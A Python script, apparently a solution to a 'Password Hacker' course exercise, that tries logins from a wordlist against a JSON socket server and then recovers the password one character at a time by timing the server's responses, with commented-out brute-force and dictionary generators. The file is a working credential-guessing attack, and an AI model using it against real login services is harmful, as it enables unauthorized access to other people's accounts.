import argparse
# import itertools
import json
import socket
import string
from datetime import datetime


parser = argparse.ArgumentParser()
parser.add_argument('host',)
parser.add_argument('port', type=int)

args = parser.parse_args()

request = {
    'login': '',
    'password': ' '
}


def brute_force(generator_login):
    with socket.socket() as client:
        client.connect((args.host, args.port))
        for login in generator_login:
            request['login'] = login
            json_str = json.dumps(request)
            client.send(json_str.encode())
            json_response = client.recv(1024).decode()
            response = json.loads(json_response)
            if response["result"] != "Wrong password!":
                continue

            letter = ''
            pool = string.ascii_letters + string.digits

            while True:
                for password in pool:
                    request['password'] = letter + password
                    json_str = json.dumps(request)
                    start = datetime.now()
                    client.send(json_str.encode())
                    json_response = client.recv(1024).decode()
                    finish = datetime.now()
                    response = json.loads(json_response)
                    difference = (finish - start).total_seconds()
                    if difference >= 0.1:
                        letter += password
                        continue
                    elif response["result"] == "Connection success!":
                        return json_str

                    continue


# def generate_simple_brute_force():
#     pool = string.ascii_lowercase + string.digits
#
#     for length in range(1, len(pool) + 1):
#         for product in itertools.product(pool, repeat=length):
#             yield ''.join(product)
#
#
# def generate_dict_brute_force():
#     with open('passwords.txt', 'r') as passwords:
#         for password in passwords:
#             upper = password.upper().strip()
#             lower = password.lower().strip()
#             zipped = zip(upper, lower)
#
#             for product in itertools.product(*zipped):
#                 yield ''.join(product)


def generate_dict_login():
    with open('D:\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt', 'r') as logins:
        for login in logins:
            yield login.strip()


print(brute_force(generate_dict_login()))
